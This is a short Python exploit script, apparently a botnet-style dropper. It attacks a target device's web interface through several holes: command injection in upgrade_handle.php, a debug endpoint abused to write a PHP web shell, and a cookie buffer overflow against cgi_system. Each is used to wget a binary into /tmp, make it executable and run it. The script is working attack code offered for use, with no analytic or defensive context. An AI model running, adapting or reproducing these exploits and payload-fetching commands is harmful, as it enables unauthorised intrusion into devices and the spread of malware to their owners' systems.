#!/user/bin/env python

import requests,sys,re

def httpRequest(URL,HEADER,BODY,TIMEOUT):
    if not BODY:
        try:
            res = requests.get(URL, headers=HEADER, verify=False, timeout=TIMEOUT)
        except Exception as e:
        #print 'timeout'
            return 0,'TIMEOUT'
        else:
            if res.status_code :
                return res.status_code,res.content
            else:
                return 0,'PAGE NOT FOUND'
    else:
        try:
            res = requests.post(URL, data=BODY, headers=HEADER, verify=False, timeout=TIMEOUT)
        except Exception as e:
        #print 'timeout'
            return 0,'TIMEOUT'
        else:
            if res.status_code :
                return res.status_code,res.content
            else:
                return 0,'PAGE NOT FOUND'


def COMMANDEXECUTE(URL):
###/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;ps;%27
    upgrade = URL + "/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;ping%20whoami.ca;%27"
    debug1 = URL+'/__debugging_center_utils___.php?log=1337;echo%20%22%3C?php%20system(%5C$_REQUEST[''cmd'']);%20?%3E%22%20%3E%20raidh.php'
    debug2 = URL+'/raidh.php?cmd=wget%20-O%20/tmp/$bt%20$addrbt;chmod%20777%20/tmp/$bt;cd%20/tmp;./$bt;rm%20raidh.php'

    OverflowUrl = URL+'/cgi-bin/cgi_system?cmd=portCheck'
    Overflow2 = 'wget $shaddr -O /tmp/$sh'
    Overflow3 = 'chmod 777 /tmp/$bt&`cd /tmp&&./$bt`&'

    headers1 = {'Accept': '*/*','Cookie': 'PHPSESSID=982e6c010064b3878a4b793bfab8d2d2'+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDD'+'\x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40' +Overflow2}
    headers2 = {'Accept': '*/*','Cookie': 'PHPSESSID=982e6c010064b3878a4b793bfab8d2d2'+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDD'+'\x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40' +Overflow3}

    requests.get(upgrade)

    httpRequest(OverflowUrl,headers1,0,5)
    
    httpRequest(OverflowUrl, headers2,0,5)


    a,data = httpRequest(debug1,'',0,5)
    a,data = httpRequest(debug2,'',0,5)
    
    return True


if sys.argv[1]:
    COMMANDEXECUTE(sys.argv[1])
else:
    print 'add parmeter'